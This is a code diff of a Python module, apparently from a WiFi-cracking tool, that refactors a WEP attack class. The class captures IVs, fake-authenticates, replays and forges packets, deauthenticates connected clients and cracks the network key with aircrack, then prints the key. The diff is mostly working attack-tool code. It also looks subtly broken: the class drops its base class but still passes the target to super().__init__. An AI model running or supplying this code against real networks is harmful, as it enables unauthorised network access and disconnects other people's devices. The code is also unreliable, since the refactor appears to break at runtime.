@@ -2,7 +2,6 @@
 # -*- coding: utf-8 -*-
 
 import time
-
 from ..config import Configuration
 from ..model.attack import Attack
 from ..model.wep_result import CrackResultWEP
@@ -13,7 +12,7 @@ from ..tools.ip import Ip
 from ..util.color import Color
 
 
-class AttackWEP(Attack):
+class AttackWEP:
     """
         Contains logic for attacking a WEP-encrypted access point.
     """
@@ -21,7 +20,7 @@ class AttackWEP(Attack):
     fakeauth_wait = 5  # TODO: Configuration?
 
     def __init__(self, target):
-        super(AttackWEP, self).__init__(target)
+        super().__init__(target)
         self.crack_result = None
         self.success = False
 
@@ -53,11 +52,11 @@ class AttackWEP(Attack):
             try:
                 # Start Airodump process
                 with Airodump(channel=self.target.channel,
-                                          target_bssid=self.target.bssid,
-                                          ivs_only=True,  # Only capture IVs packets
-                                          skip_wps=True,  # Don't check for WPS-compatibility
-                                          output_file_prefix='wep',
-                                          delete_existing_files=not keep_ivs) as airodump:
+                                                      target_bssid=self.target.bssid,
+                                                      ivs_only=True,  # Only capture IVs packets
+                                                      skip_wps=True,  # Don't check for WPS-compatibility
+                                                      output_file_prefix='wep',
+                                                      delete_existing_files=not keep_ivs) as airodump:
 
                     Color.clear_line()
                     Color.p('\r{+} {O}waiting{W} for target to appear...')
@@ -107,7 +106,7 @@ class AttackWEP(Attack):
                         current_ivs = airodump_target.ivs
                         total_ivs = previous_ivs + current_ivs
 
-                        status = '%d/{C}%d{W} IVs' % (total_ivs, Configuration.wep_crack_at_ivs)
+                        status = f'{total_ivs:d}/{{C}}{Configuration.wep_crack_at_ivs:d}{{W}} IVs'
                         if fakeauth_proc:
                             status += ', {G}fakeauth{W}' if fakeauth_proc.status else ', {R}no-auth{W}'
                         if aireplay.status is not None:
@@ -117,26 +116,9 @@ class AttackWEP(Attack):
 
                         # Check if we cracked it.
                         if aircrack and aircrack.is_cracked():
-                            (hex_key, ascii_key) = aircrack.get_key_hex_ascii()
-                            # bssid = airodump_target.bssid
-                            # if airodump_target.essid_known:
-                            #     essid = airodump_target.essid
-                            # else:
-                            #     essid = None
-                            Color.pl('\n{+} {C}%s{W} WEP attack {G}successful{W}\n' % attack_name)
-                            if aireplay:
-                                aireplay.stop()
-                            if fakeauth_proc:
-                                fakeauth_proc.stop()
-
-                            self.crack_result = CrackResultWEP(self.target.bssid, self.target.essid, hex_key, ascii_key)
-                            self.crack_result.dump()
-
-                            Airodump.delete_airodump_temp_files('wep')
-
-                            self.success = True
-                            return self.success
-
+                            return self._extracted_from_run_93(
+                                aircrack, attack_name, aireplay, fakeauth_proc
+                            )
                         if aircrack and aircrack.is_running():
                             # Aircrack is running in the background.
                             Color.p('and {C}cracking{W}')
@@ -173,10 +155,10 @@ class AttackWEP(Attack):
                                 xor_file = Aireplay.get_xor()
                                 if not xor_file:
                                     # If .xor is not there, the process failed.
-                                    Color.pl('\n{!} {O}%s attack{R} did not generate a .xor file' % attack_name)
+                                    Color.pl(f'\n{{!}} {{O}}{attack_name} attack{{R}} did not generate a .xor file')
                                     # XXX: For debugging
-                                    Color.pl('{?} {O}Command: {R}%s{W}' % ' '.join(aireplay.cmd))
-                                    Color.pl('{?} {O}Output:\n{R}%s{W}' % aireplay.get_output())
+                                    Color.pl(f'{{?}} {{O}}Command: {{R}}{" ".join(aireplay.cmd)}{{W}}')
+                                    Color.pl(f'{{?}} {{O}}Output:\n{{R}}{aireplay.get_output()}{{W}}')
                                     break
 
                                 # If .xor exists, run packetforge-ng to create .cap
@@ -199,16 +181,16 @@ class AttackWEP(Attack):
                                 continue
                             else:
                                 Color.pl('\n{!} {O}aireplay-ng exited unexpectedly{W}')
-                                Color.pl('{?} {O}Command: {R}%s{W}' % ' '.join(aireplay.cmd))
-                                Color.pl('{?} {O}Output:\n{R}%s{W}' % aireplay.get_output())
+                                Color.pl(f'{{?}} {{O}}Command: {{R}}{" ".join(aireplay.cmd)}{{W}}')
+                                Color.pl(f'{{?}} {{O}}Output:\n{{R}}{aireplay.get_output()}{{W}}')
                                 break  # Continue to other attacks
 
                         # Check if IVs stopped flowing (same for > N seconds)
                         if airodump_target.ivs > last_ivs_count:
                             time_unchanged_ivs = time.time()
                         elif Configuration.wep_restart_stale_ivs > 0 and \
-                                    attack_name != 'chopchop' and \
-                                    attack_name != 'fragment':
+                                        attack_name != 'chopchop' and \
+                                        attack_name != 'fragment':
                             stale_seconds = time.time() - time_unchanged_ivs
                             if stale_seconds > Configuration.wep_restart_stale_ivs:
                                 # No new IVs within threshold, restart aireplay
@@ -224,31 +206,45 @@ class AttackWEP(Attack):
 
                         time.sleep(1)
                         continue
-                                # End of big while loop
-                        # End of with-airodump
+                                                # End of big while loop
+                                        # End of with-airodump
             except KeyboardInterrupt:
                 if fakeauth_proc:
                     fakeauth_proc.stop()
                 if not attacks_remaining:
-                    if keep_ivs:
-                        Airodump.delete_airodump_temp_files('wep')
-
-                    self.success = False
-                    return self.success
-
+                    return self._extracted_from_run_206(keep_ivs)
                 if self.user_wants_to_stop(attack_name, attacks_remaining, airodump_target):
-                    if keep_ivs:
-                        Airodump.delete_airodump_temp_files('wep')
-
-                    self.success = False
-                    return self.success
-
+                    return self._extracted_from_run_206(keep_ivs)
             except Exception as e:
                 Color.pexception(e)
                 continue
                 # End of big try-catch
-        # End of for-each-attack-type loop
+        return self._extracted_from_run_206(keep_ivs)
 
+    # TODO Rename this here and in `run`
+    def _extracted_from_run_93(self, aircrack, attack_name, aireplay, fakeauth_proc):
+        (hex_key, ascii_key) = aircrack.get_key_hex_ascii()
+        # bssid = airodump_target.bssid
+        # if airodump_target.essid_known:
+        #     essid = airodump_target.essid
+        # else:
+        #     essid = None
+        Color.pl(f'\n{{+}} {{C}}{attack_name}{{W}} WEP attack {{G}}successful{{W}}\n')
+        if aireplay:
+            aireplay.stop()
+        if fakeauth_proc:
+            fakeauth_proc.stop()
+
+        self.crack_result = CrackResultWEP(self.target.bssid, self.target.essid, hex_key, ascii_key)
+        self.crack_result.dump()
+
+        Airodump.delete_airodump_temp_files('wep')
+
+        self.success = True
+        return self.success
+
+    # TODO Rename this here and in `run`
+    def _extracted_from_run_206(self, keep_ivs):
         if keep_ivs:
             Airodump.delete_airodump_temp_files('wep')
 
@@ -271,23 +267,23 @@ class AttackWEP(Attack):
 
         # Deauth clients & retry
         attack_index = 1
-        Color.pl('     {G}1{W}: {O}Deauth clients{W} and {G}retry{W} {C}%s attack{W} against {G}%s{W}' % (
-            current_attack, target_name))
+        Color.pl(
+            f'     {{G}}1{{W}}: {{O}}Deauth clients{{W}} and {{G}}retry{{W}} {{C}}{current_attack} attack{{W}} against {{G}}{target_name}{{W}}')
 
         # Move onto a different WEP attack
         for attack_name in attacks_remaining:
             attack_index += 1
             Color.pl(
-                '     {G}%d{W}: Start new {C}%s attack{W} against {G}%s{W}' % (attack_index, attack_name, target_name))
+                f'     {{G}}{attack_index:d}{{W}}: Start new {{C}}{attack_name} attack{{W}} against {{G}}{target_name}{{W}}')
 
         # Stop attacking entirely
         attack_index += 1
-        Color.pl('     {G}%d{W}: {R}Stop attacking, {O}Move onto next target{W}' % attack_index)
+        Color.pl(f'     {{G}}{attack_index:d}{{W}}: {{R}}Stop attacking, {{O}}Move onto next target{{W}}')
         while True:
-            Color.p('{?} Select an option ({G}1-%d{W}): ' % attack_index)
+            Color.p(f'{{?}} Select an option ({{G}}1-{attack_index:d}{{W}}): ')
             answer = input()
             if not answer.isdigit() or int(answer) < 1 or int(answer) > attack_index:
-                Color.pl('{!} {R}Invalid input: {O}Must enter a number between {G}1-%d{W}' % attack_index)
+                Color.pl(f'{{!}} {{R}}Invalid input: {{O}}Must enter a number between {{G}}1-{attack_index:d}{{W}}')
                 continue
             answer = int(answer)
             break
@@ -306,20 +302,20 @@ class AttackWEP(Attack):
                     continue  # Don't deauth ourselves.
 
                 Color.clear_entire_line()
-                Color.p('\r{+} {O}Deauthenticating client {C}%s{W}...' % client.station)
+                Color.p(f'\r{{+}} {{O}}Deauthenticating client {{C}}{client.station}{{W}}...')
 
                 Aireplay.deauth(target.bssid, client_mac=client.station, essid=target.essid)
                 deauth_count += 1
 
             Color.clear_entire_line()
-            Color.pl('\r{+} Sent {C}%d {O}deauths{W}' % deauth_count)
+            Color.pl(f'\r{{+}} Sent {{C}}{deauth_count:d} {{O}}deauths{{W}}')
 
             # Re-insert current attack to top of list of attacks remaining
             attacks_remaining.insert(0, current_attack)
             return False  # Don't stop
-        elif answer == attack_index:
+        if answer == attack_index:
             return True  # Stop attacking
-        elif answer > 1:
+        if answer > 1:
             # User selected specific attack: Re-order attacks based on desired next-step
             attacks_remaining.insert(0, attacks_remaining.pop(answer - 2))
             return False  # Don't stop
@@ -329,7 +325,7 @@ class AttackWEP(Attack):
         Attempts to fake-authenticate with target.
         Returns: True if successful, False is unsuccessful.
         """
-        Color.p('\r{+} attempting {G}fake-authentication{W} with {C}%s{W}...' % self.target.bssid)
+        Color.p(f'\r{{+}} attempting {{G}}fake-authentication{{W}} with {{C}}{self.target.bssid}{{W}}...')
         fakeauth = Aireplay.fakeauth(self.target, timeout=AttackWEP.fakeauth_wait)
         if fakeauth:
             Color.pl(' {G}success{W}')
@@ -337,9 +333,9 @@ class AttackWEP(Attack):
             Color.pl(' {R}failed{W}')
             if Configuration.require_fakeauth:
                 # Fakeauth is required, fail
-                raise Exception('Fake-authenticate did not complete within %d seconds' % AttackWEP.fakeauth_wait)
+                raise Exception(f'Fake-authenticate did not complete within {AttackWEP.fakeauth_wait:d} seconds')
             # Warn that fakeauth failed
-            Color.pl('{!} {O} unable to fake-authenticate with target (%s){W}' % self.target.bssid)
+            Color.pl(f'{{!}} {{O}} unable to fake-authenticate with target ({self.target.bssid}){{W}}')
             Color.pl('{!} continuing attacks because {G}--require-fakeauth{W} was not set')
         return fakeauth
 
